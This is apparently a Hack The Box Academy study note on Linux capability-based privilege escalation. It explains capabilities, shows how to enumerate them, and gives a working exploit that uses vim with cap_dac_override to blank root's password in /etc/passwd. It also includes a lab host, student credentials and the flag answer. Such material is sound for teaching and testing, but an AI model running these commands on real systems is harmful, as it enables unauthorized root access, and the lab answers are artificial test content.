# Capabilities
Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.

## Set Capability
We can use the setcap command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

```shellsession
$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Some capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly.

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Capability</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Description</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_admin</code></td><td class="p-4">Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_chroot</code></td><td class="p-4">Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_ptrace</code></td><td class="p-4">Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_nice</code></td><td class="p-4">Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_time</code></td><td class="p-4">Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_resource</code></td><td class="p-4">Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_module</code></td><td class="p-4">Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_net_bind_service</code></td><td class="p-4">Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td></tr></tbody></table>

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Capability</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Description</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_setuid</code></td><td class="p-4">Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">root</code> user.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_setgid</code></td><td class="p-4">Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">root</code> group.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_sys_admin</code></td><td class="p-4">This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">root</code> user, such as modifying system settings and mounting and unmounting file systems.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">cap_dac_override</code></td><td class="p-4">Allows bypassing of file read, write, and execute permission checks.</td></tr></tbody></table>

## Enumerating Capabilities
To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:

```shellsession
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

This one-liner uses the `find` command to search for all binary executables in the directories where they are typically located and then uses the `-exec` flag to run the getcap command on each, showing the capabilities that have been set for that binary. 

## Exploitation
If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:

```shellsession
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```shellsession
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Now, we can see that the `x` in that line is gone (before it was `root:x:0:0:root:/root:/bin/bash`), which means that we can use the command su to log in as root without being asked for the password.

## Questions
SSH to 10.129.205.111 (ACADEMY-LLPE-CAP), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer. **Answer: HTB{c4paBili7i3s_pR1v35c}**
   - List all existing capabilities for all existing binary executables:
        ```shellsession
        $ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
        /usr/bin/mtr-packet = cap_net_raw+ep
        /usr/bin/ping = cap_net_raw+ep
        /usr/bin/traceroute6.iputils = cap_net_raw+ep
        /usr/bin/vim.basic = cap_dac_override+eip
        ```
   - Leverage vim with cap_dac_override capability set to modify the root entry in /etc/passwd to escalate privilege to root:
        ```shellsession
        $ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
        $ cat /etc/passwd | head -n1
        root::0:0:root:/root:/bin/bash
        $ su
        root@ubuntu:/home/htb-student# cat /root/flag.txt 
        HTB{c4paBili7i3s_pR1v35c}
        ```